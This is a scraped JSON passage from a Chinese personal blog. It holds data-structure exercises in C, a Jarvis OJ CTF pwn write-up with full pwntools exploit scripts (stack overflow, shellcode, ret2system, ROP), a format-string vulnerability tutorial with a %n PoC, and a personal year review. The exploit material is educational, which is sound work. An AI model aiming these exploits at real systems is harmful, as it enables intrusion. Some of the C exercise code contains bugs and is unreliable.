next = q; } return OK; } 2.21 试写一算法，实现顺序表的就地逆置，即利用原表的存储空间将线性表倒置。 Status ListReverse_Sq(SqList &amp;L) { int i; ElemType x; for(i = 0; i &lt; l.length/2; i++) { x = L.elem[i]; L.elem[i] = L.elem[L.length-1-i]; L.elem[L.length-1-i] = x; } return OK; } 2.22 试写一算法，对单链表实现就地逆置。 Status ListReverse_L(LinkList &amp;L) { LinkList p,q; p = L -&gt; next; L -&gt; next = NULL; while(p){ q = p; p = p -&gt; next; q -&gt; next = L -&gt; next; L -&gt; next = q; } return OK; } 2.25 假设以两个元素依值递增有序排列的线性表 A和 B 分别表示两个集合（即同一表中的元素 值各不相同） ，现要求另辟空间构成一个线性表 C，其元素为 A 和 B中元素的交集，且表 C中的 元素依值递增有序排列。试对顺序表编写求 C的算法。 Status SqList_Insert(SqList A, SqList B, SqList &amp;C) { int i = 1, j = 1, k = 0; while(A.elem[i] &amp;&amp; B.elem[j]) { if(A.elem[i] &lt; B.elem[j]) i++; if(A.elem[i] &gt; B.elem[j]) j++; if(A.elem[i] = B.elem[j]) { C.elem[k++] = B.elem[j]; i++; j++; } } return OK; }","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"重温数据结构-栈和队列","slug":"重温数据结构-栈和队列","date":"2018-07-30T10:11:11.000Z","updated":"2018-07-31T12:55:07.736Z","comments":true,"path":"2018/07/30/重温数据结构-栈和队列/","link":"","permalink":"http://leo.dropsec.xyz/2018/07/30/重温数据结构-栈和队列/","excerpt":"自认为听起来的“堆栈”和看起来的“殷墟”一样，让人着迷。","text":"自认为听起来的“堆栈”和看起来的“殷墟”一样，让人着迷。 栈栈（stack）是限定仅在表尾进行插入或删除操作的线性表。因此，对栈来说，表尾端有其特殊含义，称为栈顶，相应地，表头端称为栈底。 栈又称为后进先出的线性表（简称LIFO结构）。 栈的基本操作包含建栈、入栈、出栈… 以下是栈的实现方式：//栈的顺序存储表示 #define STACK_INIT_SIZE 100 //存储空间初始分配量 #define STACKINCREMENT 10 //存储空间分配增量 typedef struct { SElemType * base; //在栈构造之前和销毁之后，base的值为null SElemType * top; //栈顶指针 int stacksize; //当前已分配的存储空间，以元素为单位 }SqStack; //基本操作的算法描述（部分） Status InitStack (SqStack &amp;S) { //构造一个空栈S S.base = (SElemType * ) malloc (STACK_INIT_SIZE * sizeof(SElemType)); if (!S.base) exit (overflow); //存储分配失败 S.top = S.base; S.stacksize = STACK_INIT_SIZE; return OK; }//InitStack Status GetTop (SqStack S, SElemType &amp;e) { //若栈不空，则用e返回S的栈顶元素，并返回OK；否则返回ERROR if (S.top == S.base) return ERROR; e = * (S.top - 1); return OK; }//GetTop Status Push (SqStack &amp;S, SElemType e) { //插入元素e为新的栈顶元素 if (S.top - S.base &gt;= S.stacksize) { //栈满，追加存储空间 S.base = (SElemType * ) realloc (S.base, (S.stacksize + STACKINCREMENT) * sizeof (SElemType)); if (!S.base) exit (OVERFLOW); //存储分配失败 S.top = S.base + S.stacksize; S.stacksize += STACKINCREMENT; } * S.top++ = e; return OK; }//Push Status Pop (SqStack &amp;S, SelemType &amp;e) { //若栈不空，则删除S的栈顶元素，用e返回其值，并返回OK；否则返回ERROR if (S.top == S.base) return ERROR; e = * --S.top; return OK; }//Pop 队列和栈相反，队列（queue）是一种先进先出（FIFO）的线性表。它只允许在表的一端进行插入，而在另一端删除元素。在队列中，允许插入的一端叫做队尾，允许删除的一端叫做队头。 队列的基本操作包括：构造队列、销毁队列、插入元素、删除元素… 以下是队列的实现方式：单链队列–链式存储//单链队列的链式存储结构 typedef struct QNode { QElemType data; struct QNode * next; }QNode, * QueuePtr; typedef struct { QueuePtr front; //队头指针 QueuePtr rear; //队尾指针 }LinkQueue; //基本操作的算法描述（部分） Status InitQueue (LinkQueue &amp;Q) { //构造一个空队列Q Q.front = Q.rear = (QueuePtr) malloc (sizeof(QNode)); if (!Q.front) exit (OVERFLOW); //存储分配失败 Q.front -&gt; next = NULL; return OK; } Status DestroyQueue (LinkQueue &amp;Q) { //销毁队列Q while (Q.front) { Q.rear = Q.front -&gt; next; free (Q.front); Q.front = Q.rear; } return OK; } Status EnQueue (LinkQueue &amp;Q, QElemType e) { //插入元素e 为Q的队尾元素 p = (QueuePtr) malloc (sizeof(QNode)); if(!p) exit (OVERFLOW); //存储分配失败 p -&gt; data = e; p -&gt; next = NULL; Q.rear -&gt; next = p; Q.rear = p; return OK; } Status DeQueue (LinkQueue &amp;Q, QElemType &amp;e) { //若队列不空，则删除Q的队头元素，用e返回其值，并返回OK 否则返回ERROR if (Q.front == Q.rear) return ERROR; p = Q.front -&gt; next; e = p -&gt; data; Q.front -&gt; next = p -&gt; next; if (Q.rear == p) Q.rear = Q.front; //一般情况下，删除队列头元素时仅需修改头结点中的指针 free (p); //但当队列中最后一个元素被删除后，队列尾指针也丢失了，因此需要对队尾指针重新赋值（指向头结点） return OK; } 循环队列–顺序存储//循环队列 顺序存储结构 #define MAXQSIZE 100 //最大队列长度 typedef struct { QElemType * base; //初始化的动态分配存储空间 int front; //头指针，若队列不空，指向队列头元素 int rear; //尾指针，若队列不空，指向队列尾元素的下一个位置 }SqQueue; //循环队列的基本操作的算法描述 Status InitQueue (SqQueue &amp;Q) { //构造一个空队列Q Q.base = (QElemType * ) malloc (MAXQSIZE * sizeof (QElemType)); if (!Q.base) exit(OVERFLOW); //存储分配失败 Q.front = Q.rear = 0; return OK; } int QueueLength (SqQueue Q) { //返回Q的元素个数，即队列长度 return (Q.rear - Q.front + MAXQSIZE) % MAXQSIZE; } Status EnQueue (SqQueue &amp;Q, QElemType e) { //插入元素e 为Q的队尾元素 if ((Q.rear + 1) % MAXQSIZE == Q.front) return ERROR; //队列满 Q.base[Q.rear] = e; Q.rear = (Q.rear + 1) % MAXQSIZE; return OK; } Status DeQueue (SqQueue &amp;Q, QElemType &amp;e) { //若队列不空，则删除Q的队头元素，用e返回其值，并返回OK，否则返回ERROR if(Q.front == Q.rear) return ERROR; e = Q.base[Q.front]; Q.front = (Q.front + 1) % MAXQSIZE; return OK; } 题集经典例题：3.15 假设以顺序存储结构实现一个双向栈，即在一维数组的存储空间中存在着两个栈，它们的栈底分别设在数组的两个端点。 试编写实现这个双向栈 tws 的三个操作： 初始化 inistack(tws) 、 入栈 push(tws,i,x) 和出栈 pop(tws,i) 的算法，其中 i 为 0 或 1，用以分别指示设在数组两端的 两个栈 typedef struct { Elemtype * base[2]; Elemtype * top[2]; }BDStacktype; //双向栈类型 Status Init_Stack (BDStacktype &amp;tws, int m) //初始化一个大小为m的双向栈tws { tws.base[0] = (Elemtype * ) malloc (sizeof(Elemtype)); tws.base[1] = tws.base[0] + m; tws.top[0] = tws.base[0]; tws.top[1] = tws.base[1]; return OK; } Status push (BDStscktype &amp;tws, int i, Elemtype x) //x入栈，i=0表示低端栈，i=1表示高端栈 { if (tws.top[0] &gt; tws.top[1]) return OVERFLOW; if (i == 0) * tws.top[0]++ = x; else if (i == 1) * tws.top[1]-- = x; else return ERROR; return OK; } Status pop (BDStacktype &amp;tws, int i, Elemtype &amp;x) { if (i == 0) { if (tws[0] == tws.base[0]) return OVERFLOW; x = * --tws.top[0]; } else if (i == 1) { if (tws.top[1] == tws.base[1]) return OVERFLOW; x = * ++tws.top[1]; } else return ERROR; return OK; } 3.16 假设如题 3.1 所属火车调度站的入口处有 n 节硬席或软席车厢（分别以 H和 S 表示）等待 调度，试编写算法，输出对这 n 节车厢进行调度的操作（即入栈或出栈操作）序列，以使所有的 软席车厢都被调整到硬席车厢之前。 void Train_arrange (char * train) //字符串train表示火车 H表示硬席 S表示软席 { p = q = train; InitStack (s); while ( * p) { if ( * p == &apos;H&apos; ) push (s, *p); else * (q++) = * p; //把S调到前部 p++; } while (!StackEmpty(s)) { pop (s,c); * (q++) = c; //把H接到后部 } } 3.17 试写一个算法，识别一次读入的一个以 @为结束符的字符序列是否为形如‘序列 1&amp;序列 2’ 模式的字符序列。其中序列 1 和序列 2 中都不含字符‘ &amp;’，且序列 2 是序列 1 的逆序列。例如， ‘a+b&amp;b+a’是属该模式的字符序列，而‘ 1+3&amp;3-1 ’则不是。 int IsReverse () //判断输入的字符串中&apos;&amp;&apos;前和&apos;&amp;&apos;后部分是否为逆串,是则返回1,否则返回0 { InitStack (s); while ((e = getchar()) != &apos;&amp;&apos; ) push (s,e); while ((e = getchar()) != &apos;@&apos; ) { if (StackEmpty(s)) return 0; pop (s,c); if (e != c) return 0; } if (!StackEmpty(s)) return 0; return 1; } 3.18 试写一个判别表达式中开、闭括号是否配对出现的算法。 Status Bracket_Test (char * str) //判别表达式中小括号是否匹配 { count = 0; for (p = str; * p; p++) { if ( * p == &apos;(&apos; ) count++; if ( * p == &apos;)&apos; ) count--; if (count &lt; 0) return ERROR; } if (count) //注意括号不匹配的两种情况 return ERROE; return OK; } 3.19 假设一个算术表达式中可以包括三种括号：圆括号“（”和“）”、方括号“ [ ”和“ ] ” 和花括号“{ ”和“} ”，且这三种括号可按任意的次序嵌套使用 （如：, [ , { , } , [ , ] , ] , [ , ] , ( , ) , ） 。编写判别给定表达式中所含括号是否正确配对出现的算法 （已知表达式已存入数据元 素为字符的顺序表中）。 Status AllBrackets_Test (char * str) { InitStack (s); for (p = str; * p; p++) { if ( * p == &apos;(&apos; || * p == &apos;[&apos; || * p == &apos;{&apos; ) push ( s, * p); else if ( * p == &apos;)&apos; || * p == &apos;]&apos; || * p == &apos;}&apos; ) { if (StackEmpty(s)) return ERROR; pop (s,c); if ( * p == &apos;)&apos; &amp;&amp; c != &apos;(&apos; ) return ERROR; if ( * p == &apos;]&apos; &amp;&amp; c != &apos;[&apos; ) return ERROR; if ( *p == &apos;}&apos; &amp;&amp; c != &apos;{&apos; ) return ERROR; } } if (!StackEmpty(s)) return ERROR; } 3.28 假设以带头结点的循环链表表示队列，并且只设一个指针指向队尾元素结点（注意不设头指针），试编写相应的队列初始化、入队列和出队列的算法。 void InitCiQueue (CiQueue &amp;Q) //初始化循环链表表示的队列Q { Q = (CiLNode * ) malloc (sizeof(CiLNode)); Q -&gt; next = Q; } void EnCiQueue (CiQueue &amp;Q, int x) //把元素x插入循环链表表示的队列Q,Q指向队尾元素,Q-&gt;next指向头结点,Q-&gt;next-&gt;next指向队头元素 { p = (CiLNode * ) malloc (sizeof(CiLNode)); p -&gt; data = x; p -&gt; next = Q -&gt; next; //直接把p加在Q的后面 Q -&gt; next = p; Q = p; //修改尾指针 } Status DeCiQueue (CiQueue &amp;Q, int x) //从循环链表表示的队列Q头部删除元素x { if (Q == Q -&gt; next) return INFEASIBLE; //队列已空 p = Q -&gt; next -&gt; next; x = p -&gt; data; Q -&gt; next - next = p -&gt; next; free (p); return OK; } 3.30 假设将循环队列定义为 : 以域变量 rear 和 length 分别指示循环队列中队尾元素的位置和内 含元素的个数。 试给出此循环队列的队满条件， 并写出相应的入队列和出队列的算法 （在出队列 的算法中要返回队头元素）。 Status EnCyQueue (CyQueue &amp;Q, int x) //带length域的循环队列入队算法 { if (Q.length == MAXSIZE) return OVERFLOW; Q.rear = (Q.rear + 1) % MAXSIZE; Q.base[Q.rear] = x; Q.length++; return OK; } Status DeCyQueue (CyQueue &amp;Q, int x) //带length域的循环队列出队算法 { if (Q.length == 0) return ERROR; front = (Q.rear - Q.length + 1) % MAXSIZE; x = Q.base[front]; Q.length--; } 3.31 假设称正读和反读都相同的字符序列为“回文”，例如，‘ abba’和‘ abcba’是回文， ‘abcde’和‘ ababab’则不是回文。 试写一个算法判别读入的一个以‘ @’为结束符的字符序列 是否是“回文” 。 int Palindrome_Test () //判别输入的字符串是否回文序列,是则返回1,否则返回0 { InitStack (S); InitQueue (Q); //同时使用栈和队列两种结构 while ((c = getchar()) != &apos;@&apos; ) { Push (S,c); EnQueue (Q,c); } while (!StackEmpty(S)) { Pop (S,a); DeQueue (Q,b); if (a != b) return ERROR; } return OK; }","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"Jarvis OJ PWN 入门学习","slug":"Jarvis-OJ-PWN-入门学习","date":"2018-05-14T09:29:04.000Z","updated":"2018-05-14T13:54:16.053Z","comments":true,"path":"2018/05/14/Jarvis-OJ-PWN-入门学习/","link":"","permalink":"http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/","excerpt":"背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。","text":"背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。 一、[XMAN]level0下载链接题目描述： nc pwn2.jarvisoj.com 9881 file查看文件信息，64位程序；checksec后发现开了NX，然后拉进ida找到两个关键函数 buffer的大小是0x80，而read函数直接读取0x200的数据，有典型的栈溢出漏洞。由于rbp中有0x8个字节，我们的padding需要0x80 + 0x8字节。填满buffer后调用callsystem函数即可get shell。脚本如下： from pwn import * sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9881) padding = &apos;A&apos; * 0x88 callsystem = 0x400596 #构造payload。 payload = padding + p64(callsystem) #交互 sh.send(payload) sh.interactive() p64()默认将int转为little-endian bytes。32位文件用p32()，例如： &gt;&gt;&gt; p64(0xdeadbeef) &apos;\\xef\\xbe\\xad\\xde&apos; CTF{713ca3944e92180e0ef03171981dcd41} 二、[XMAN]level1下载链接题目描述： nc pwn2.jarvisoj.com 9877 file查看文件信息，32位程序；checksec后没开常用保护机制 ida查看发现有一个关键函数这次没有callsystem函数，需要生成shellcode。没有开启NX保护，可以插入shellcode。这里buf有0x88个字节，再加上ret本身的0x4个字节，偏移量为0x8C，还要减去shellcode的长度。连接到服务器，发现每次会随机给出一个地址，类似这样： yl123456@ubuntu:~/Desktop$ nc pwn2.jarvisoj.com 9877 What&apos;s this:0xfff180b0? 编写脚本的时候要读取这个地址，将其定义为buf_addr。 脚本如下： from pwn import * #调用pwntools自带的功能生成shellcode shellcode = asm(shellcraft.sh()) io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877) #提取给出的地址并将string转为int buf_addr = int(io.recvline()[14:-2], 16) #构造payload payload = shellcode + &apos;A&apos; * (0x8C -len(shellcode)) + p32(buf_addr) io.send(payload) io.interactive() 第二种写法： from pwn import * p = remote(&quot;pwn2.jarvisoj.com&quot;,9877) shellcode = asm(shellcraft.sh()) p.recvuntil(&quot;What&apos;s this:&quot;) buf_addr = int(p.recvuntil(&quot;?&quot;)[:-1],16) payload = shellcode.ljust(140,&apos;a&apos;) + p32(buf_addr) p.send(payload) p.interactive() CTF{82c2aa534a9dede9c3a0045d0fec8617} 三、[XMAN]level2下载链接题目描述： nc pwn2.jarvisoj.com 9878 file查看文件信息，32位程序；checksec发现开了NX保护 ida查看关键函数 字符串里还发现有/bin/sh 我们需要构造system(“/bin/sh”)。脚本如下： from pwn import * sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9878) #指定elf文件 elf = ELF(&apos;./level2&apos;) #定位system函数地址 sys_addr = elf.symbols[&apos;system&apos;] #定位/bin/sh的地址 sh_addr = elf.search(&apos;/bin/sh&apos;).next() #注意这里的p32(4)是虚拟的返回地址，输入什么都可以 payload = &apos;A&apos; * 0x8C + p32(sys_addr) + p32(4) + p32(sh_addr) sh.send(payload) sh.interactive() 也可以不用定位函数，因为没开启PIE保护，所以直接用ida找到system函数、/bin/sh对应对应的地址也ok from pwn import * sys_addr = 0x08048320 sh_addr = 0x0804A024 payload = &apos;A&apos; * 0x8C + p32(sys_addr) + p32(4) + p32(sh_addr) sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9878) sh.send(payload) sh.interactive() CTF{1759d0cbd854c54ffa886cd9df3a3d52} 四、[XMAN]level2(x64)下载链接题目描述： nc pwn2.jarvisoj.com 9882 file查看文件信息，64位程序；checksec发现开了NX保护 ida查看关键函数 和level2有点类似 同样能看到/bin/sh我们可以找到system函数，/bin/sh的地址，而且可以得到0x88个字节就会溢出，这样前期准备就都做好了，剩下的就是如何将参数传递给rdi寄存器，因此，我们需要一些gadget来满足我们的需求 命令： ROPgadget --binary level2_x64 --only &apos;pop|ret&apos; 这样，我们可以很容易的找到pop rdi,地址为0x00000000004006b3 from pwn import * p = remote(&quot;pwn2.jarvisoj.com&quot;,9882) elf = ELF(&quot;./level2_x64&quot;) pop_rdi_ret_addr = 0x00000000004006b3 system_plt = elf.plt[&apos;system&apos;] sh_addr = next(elf.search(&quot;/bin/sh&quot;)) payload = &apos;a&apos; * 0x88 payload += p64(pop_rdi_ret_addr) payload += p64(sh_addr) payload += p64(system_plt) p.send(payload) p.interactive() 或者直接找地址： from pwn import * p=remote(&apos;pwn2.jarvisoj.com&apos;,9882) sh_addr=0x600a90 sys_addr=0x4004c0 popret=0x00000000004006b3 payload=&apos;a&apos;*0x88 + p64(popret) + p64(sh_addr) + p64(sys_addr) p.send(payload) p.interactive() CTF{081ecc7c8d658409eb43358dcc1cf446} 另外发现网上有些wp尝试在payload上加p64(1),后来发现此题不用加，若加必须加在最后一位才可，倒数第二位就不可。 疑问： 怎么区分加与不加(与上一题比较)？ 五、[XMAN]level3下载链接题目描述： nc pwn2.jarvisoj.com 9879","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://leo.dropsec.xyz/tags/PWN/"}]},{"title":"格式化字符串漏洞 简介","slug":"格式化字符串漏洞-简介","date":"2018-01-02T05:23:17.000Z","updated":"2019-02-10T14:59:11.867Z","comments":true,"path":"2018/01/02/格式化字符串漏洞-简介/","link":"","permalink":"http://leo.dropsec.xyz/2018/01/02/格式化字符串漏洞-简介/","excerpt":"这里是参考链接","text":"这里是参考链接 一:简介格式化字符串，也是一种比较常见的漏洞类型。会触发该漏洞的函数很有限。主要就是printf还有sprintf，fprintf等等c库中print家族的函数。 我们先来看看printf的函数声明 int printf(const char* format,…) 这个是每个学过c语言的人一定会知道、会使用的函数。先是一个字符串指针，它指向的一个format字符串。后面是个数可变的参数。一般人可能会这么用它 char str[100];scanf(“%s”,str);printf(“%s”,str); 这个程序没有问题。然后会有一些人为了偷懒会写成这种样子 char str[100];scanf(“%s”,str);printf(str) 这个程序在printf处用了一种偷懒的写法。这看起来是没有什么问题。但是却产生了一个非常严重的漏洞。 千万不要将printf中的format字符串的操纵权交给用户。保证printf函数的第一个参数是不可变的，在程序员的掌握中的。 二、漏洞的产生原理这里我们就要详细的讲述一下printf的运行原理了。因为64位上printf函数的行为发生了许多变化。这里暂时不进行说明。不过如果清楚了漏洞的产生原因，依然可以使用此漏洞。 先看看正常的情况 #include &lt;stdio.h&gt; int main(void) { printf(&quot;%d%d%d%d%s&quot;,5,6,8,0x21,&quot;test&quot;); return 0; } 首先，看看汇编的源码，额暂时搞不到，还是手写吧 .data str db &quot;test&quot;,0 format db &quot;%d%d%d%d%s&quot;,0 .code push str push 21h push 8 push 6 push 5 push format call printf 差不多就这样。这个时候的栈就会是这个样子的。 -00000003 db ? ; -00000002 db ? ; -00000001 db ? ; +00000000 s db 4 dup(?) +00000004 r db 4 dup(?) +00000008 format db 4 ;&quot;%d%d%d%c&quot; +0000000c %d db 4 ; 4 +00000010 %d db 4 ; 6 +00000014 %d db 4 ; 8 +00000018 %x db 4 ; 0x21 +0000001c %s db 4 ; &quot;test&quot; +0000001c ; end of stack variables (额，不要吐槽的那原始的栈结构表示方式，用过IDA的应该知道)。 根据cdecl的函数调用规定，函数的从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。对于不相同的类型，编译器还会自动的进行类型的转换，或者是发生编译错误，提醒程序的编写者。 但是，到了printf函数，一切就不一样了。因为printf是c语言中少有的支持可变参数的库函数。对于可变参数的函数，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。 当然这会产生一个严重的问题。如果我们无意或者有意，在format中，或者说我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是传入它参数，哪些是属于函数调用者的数据。看下面段代码 #include &lt;stdio.h&gt; int main(void) { printf(&quot;%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x&quot;); return 0; } 这里我们只给了printf一个参数，却让其打印出12个int类型的数据，我们编译运行看看会有什么结果。 运行之后可以看到，printf忠实的按照我们意愿打印出了12个数值。这些数值不是我们输入的参数，而是保存在栈中的其他的数值。通过这个特性，黑客们就创造出了格式化字符串的漏洞。 三、漏洞利用可能有人（像我一样的弱渣）会对这个漏洞的危害感到疑惑，因为它似乎只是打印一些没有用的垃圾数据而已。其实，它的危害一点不比栈溢出漏洞的危害小，如果使用得当，甚至比栈溢出效果更好。如果栈溢出是粗暴的地毯式轰炸的话，格式化字符串漏洞就是一位可怕的狙击手。一击便可致命。 至于此漏洞的利用方式，主要有2种 打印内存 刚才也看到了printf可以打印出调用者栈帧中的信息。在0day攻击当中，如何获得对方内存中的数据是非常重要的一个技巧，而格式化字符串漏洞的其中一个利用方法便是能够获得内存中那些本不应该被我们知道的数据。这个过程我们称之为leak内存。0day攻击中一种重要的方法ret to libc就是以leak基地址为前提的。 只要我们在format中填入足够的参数，那么printf就可以打出储存在栈中的，那些本不能被知道的信息。只要计算好format在栈中的地址与需要leak的信息地址之差。就可以得到想要的数据 比如format在0x20处而dest数据在0x00处。他们一共相差32个字节，那么我们就可以构造”%f%f%f%d,%x”这样的字符串。逗号前面会的”%f%f%f%d”可以打印出比foramt更高位的28个字节的数据，当然这不是我们想要的。然后最后的一个%x便可以以16进制的形式打印出我们想要的数据了。 然后，更进一步，我们知道格式化字符串还有%s参数。那么，如果在栈中保存有指向我们感兴趣数据的指针，我们就可以在打印指针的时候使用一个%s来打印别的地方的内容。而且一般的程序都会将用户输入的数据储存在栈上。这就给了我们一个构造指针的机会，再结合格式化字符串漏洞，几乎可以得到所有内存数据。 修改内存 也许格式化字符串漏洞可以打印内存信息这一点不让人奇怪。但是格式化字符串其实也可以修改内存中的数据。我们来看看下面这一段代码。 #include &lt;stdio.h&gt; int main(void) { int a; printf(&quot;aaaaaaa%n\\n&quot;,&amp;a); printf(&quot;%d\\n&quot;,a); return 0; } 这是一段有点神奇的代码 运行后可以发现a的值被printf函数修改为了7。这就是%n的功效了。这是一个不常用到的参数。它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针。通过%n我们就可以修改内存中的值了。和%sleak内存一样，只要栈中有我们需要修改的内存的地址就可以使用格式化字符串的漏洞修改它。 当然，如果需要修改的数据是相当大的数值时，我们可以使用%02333d这种形式。在打印数值右侧用0补齐不足位数的方式来补齐足。 可以看出，格式化字符串可以修改的内存范围更加广。只要构造出指针，就可以改写内存中的任何数值。和栈溢出的地毯轰炸不同。这种一次只能改写一个dword大小的内存的攻击方式更加精而致命 四、实践最好的学习方法就是实践，现在我们就来实验一下格式字符串漏洞的功效。 首先，代码 #include &lt;stdio.h&gt; int main(void) { int flag = 0; int *p = &amp;flag; char a[100]; scanf(&quot;%s&quot;,a); printf(a); if(flag == 2000) { printf(&quot;good!!\\n&quot;); } return 0; } 使用gcc编译。 然后拖进IDA中分析一下栈结构，调用printf函数时候的栈结构是这样的 -00000010 r dd ? &lt;-- 这里是printf的返回地址，向上就是printf的栈帧 -00000010 format dd ? -00000010 dd ? -00000010 dd ? -00000010 dd ? -0000000C flag dd ? -00000008 p dd ? -00000004 a db ? -00000000 db ? ; &lt;-- 再向下就都是a数组的空间 我们可以需要修改的变量是flag，而指针p便是指向flag的指针。所以可以通过p来修改flag的值为2000，从而达到我们打印出good！！的目标 %010x%010x%010x%01970x%n 这个便是我构造出的poc，很短，但是很强悍（→_→）。 那么我们来看看效果吧 good!被打印了处理。 这是本人电脑用CodeBlocks运行结果。","categories":[],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://leo.dropsec.xyz/tags/计算机系统/"}]},{"title":"Leooel 的 2017","slug":"Leooel-的-2017","date":"2018-01-01T15:10:51.000Z","updated":"2018-12-31T07:02:40.446Z","comments":true,"path":"2018/01/01/Leooel-的-2017/","link":"","permalink":"http://leo.dropsec.xyz/2018/01/01/Leooel-的-2017/","excerpt":"","text":"我喜欢现在这种温度不冷不热再偏冷一点无论在什么时候这种温度都能使我大脑保持清醒的同时也使我整个人感到清爽、愉悦 今儿贰零壹捌年第一天新的开始总要总结下过往、展望下未来吧其实几周之前心里就计划着写下年度个人总结了但总是一拖再拖到了现在 贰零壹柒 2017此时此刻我默念了好几遍这个数字竟然发现我对它是那样的陌生好像我从未经历过2017对，时间就是如此之快快到对于一个容易产生感情的人来说像从未经历依然是一个冰冷陌生的数字可是啊我的的确确跟它相处了三百多天 期间 我也收获了经历和感悟完成了某些方面的蜕变也是具有特殊意义的一年 一月 二月在广州体验了一把寒假工的生活劳动的同时也对白天与黑夜有了深一步的理解对于有些人来说哪有什么白天与黑夜白天就是黑夜 黑夜亦是白天本质属性是一样的另一方面也是首次亲临南方的大都市广州 深圳目睹了繁华 也感受到了背后的颓败都是如此吧 就像建成一座大厦的同时也会产生大量废墟新修一条马路的同时也会破坏一条马路我此时没有其他别的情感社会总是要发展的吧其他就是我对那边的马路、树木…总之就是环境挺有感觉之后有机会的话会再去的虽然这三十天中隐隐约约也失去了些什么但总体上感觉也没什么 挺好的 寒假开学到放暑假这一段时间真的没有一点记忆直到放暑假的当儿还感觉是开学还没多久估计这段时间都年少轻狂去了吧 暑假两个月除了回家的十天与去天津的四天其他的时间都在学校呆了其实也没学太多东西糊糊涂涂的二进制入了个门槛吧然后就是搭建了一个博客有了一个网上记录东西的地方也开始了浏览各种大佬的博客算是进入了一个新的世界但是能不能利用好这个世界里的资源就看自己喽嗯 天津能感觉出来它没有南方都市那样的充满了活力但是依然很富足就像是生活很祥和的中年人比较欣赏那边人的生活精神状态喂 来个煎饼果子虽然并不怎么可口 但还是津津有味的吃了下去 九月算是比较忙碌的一个月作为班助在帮助石器适应大学生活上用了点时间同时也结识了一些鲜肉学弟学妹 十月十一月十二月生活比较平静没有什么大的事情也就按部就班的学了一些东西反正是没好好听老师讲课也没好好写作业然后 然后就到现在了准备复习迎接末考虽然中间夹杂了一个课程设计还是我没有好好学的数据结构哎 好惨好惨 最后还是要感谢贰零壹柒这一年的时光是你一点点见证了我的成长最后的最后还要感谢那些陪伴我、关心我、爱我的人有你们 我才能这样快乐无忧的学习与生活","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"数据结构 知识回顾","slug":"数据结构-知识回顾","date":"2017-12-27T13:13:09.000Z","updated":"2019-02-10T14:15:29.361Z","comments":true,"path":"2017/12/27/数据结构-知识回顾/","link":"","permalink":"http://leo.dropsec.xyz/2017/12/27/数据结构-知识回顾/","excerpt":"拥抱被我冷落在角落的数据结构吧!","text":"拥抱被我冷落在角落的数据结构吧! 结合小玉老师的博客总结。 顺序表基本操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#include &lt;iostream&gt;using namespace std;#define Maxsize 100 //最大空间typedef struct&#123; int *elem; int length; // 顺序表的长度&#125;SqList;bool InitList(SqList &amp;L) //构造一个空的顺序表L&#123; //L加&amp;表示引用类型参数，函数内部的改变跳出函数仍然有效//不加&amp;内部改变，跳出函数后无效 L.elem=new int[Maxsize]; //为顺序表分配Maxsize个空间 if(!L.elem) return false; //存储分配失败 L.length=0; //空表长度为0 return true;&#125;bool CreateList(SqList &amp;L) //创建一个顺序表L&#123; //L加&amp;表示引用类型参数，函数内部的改变跳出函数仍然有效//不加&amp;内部改变，跳出函数后无效 int a,i=0; cin&gt;&gt;a; while(a!=-1) &#123; if(L.length==Maxsize) &#123; cout&lt;&lt;\"顺序表已满！\"; return false; &#125; L.elem[i++]=a; L.length++; cin&gt;&gt;a; &#125; return true;&#125;bool GetElem(SqList L,int i,int &amp;e)&#123; if (i&lt;1||i&gt;L.length) return false; //判断i值是否合理，若不合理，返回false e=L.elem[i-1]; //第i-1的单元存储着第i个数据 return true;&#125;int LocateELem(SqList L,int x)&#123; for (int i=0;i&lt;L.length;i++) if (L.elem[i]==x) return i+1;//第几个元素，例如第5个元素，下标其实为4 return -1;&#125;bool ListInsert_Sq(SqList &amp;L,int i ,int e)&#123; if(i&lt;1 || i&gt;L.length+1)return false; //i值不合法 if(L.length==Maxsize) return false; //存储空间已满 for(int j=L.length-1;j&gt;=i-1;j--) L.elem[j+1]=L.elem[j]; //从最后一个元素开始后移，直到第i个元素后移 L.elem[i-1]=e; //将新元素e放入第i个位置 L.length++; //表长增1 return true;&#125;bool ListDelete_Sq(SqList &amp;L,int i,int &amp;e)&#123; if((i&lt;1)||(i&gt;L.length))return false; //i值不合法 e=L.elem[i-1]; //将欲删除的元素保留在e中 for (int j=i; j&lt;=L.length-1; j++) L.elem[j-1] =L.elem[j]; //被删除元素之后的元素前移 L.length--; //表长减1 return true;&#125;void print(SqList L)&#123; cout &lt;&lt; \"输出顺序表\" &lt;&lt;endl; 